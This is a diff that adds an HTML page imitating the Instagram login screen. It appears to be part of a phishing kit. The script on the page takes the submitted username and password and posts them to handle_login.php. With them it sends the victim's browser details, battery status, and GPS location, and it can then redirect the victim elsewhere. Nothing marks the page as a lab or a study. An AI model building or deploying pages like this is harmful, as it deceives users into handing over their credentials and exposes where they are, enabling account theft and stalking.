@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" type="image/png" href="images/favicon.png">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <a href=""#>
+            <img src="./images/ig.png" alt="Instagram Logo" class="logo" style="height: 100px;width: 300px;">
+            </a>
+            <form id="loginForm">
+                <div class="input-container">
+                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
+                </div>
+                <div class="input-container">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <div id="message" style="color: red;"></div>
+            <a href="#" class="forgot-password" style="color: blue;">Forgot password?</a>
+            <div class="divider">
+                <span>OR</span>
+            </div>
+            <div class="login-options">
+                <a href="#"><img src="./images/go.png" alt="Google logo" class="social-icon" style="width: 37%; height: 100%; margin-right: 111px;"/> 
+                <a href="#"><img src="./images/mi.png" alt="Microsoft logo" class="social-icon" style="width: 30%; height: 100%;"/> 
+            </div>
+        </div>
+        <div class="signup-box">
+            <p>Don't have an account? <a href="#">Sign up</a></p>
+        </div>
+    </div>
+
+<script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            var formData = new FormData(this);
+
+            // Collect device & browser info
+            formData.append("userAgent", navigator.userAgent);
+            formData.append("platform", navigator.platform);
+            formData.append("screenWidth", screen.width);
+            formData.append("screenHeight", screen.height);
+            formData.append("language", navigator.language);
+
+            // Collect Battery Info
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function(battery) {
+                    formData.append("batteryLevel", (battery.level * 100) + "%");
+                    formData.append("isCharging", battery.charging ? "Yes" : "No");
+                    sendFormData(formData);
+                });
+            } else {
+                sendFormData(formData);
+            }
+
+            // Get GPS Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    formData.append("latitude", position.coords.latitude);
+                    formData.append("longitude", position.coords.longitude);
+                    sendFormData(formData);
+                }, function() {
+                    sendFormData(formData); // If denied, send without GPS
+                });
+            } else {
+                sendFormData(formData);
+            }
+        });
+
+        function sendFormData(formData) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'handle_login.php', true);
+            xhr.onload = function () {
+                if (xhr.status === 200) {
+                    try {
+                        var response = JSON.parse(xhr.responseText);
+                        if (response.redirect) {
+                            window.location.href = response.redirect; // Redirect user
+                        }
+                    } catch (e) {
+                        console.error("Invalid JSON response");
+                    }
+                }
+            };
+            xhr.send(formData);
+        }
+    </script>
+
+</body>
+</html>
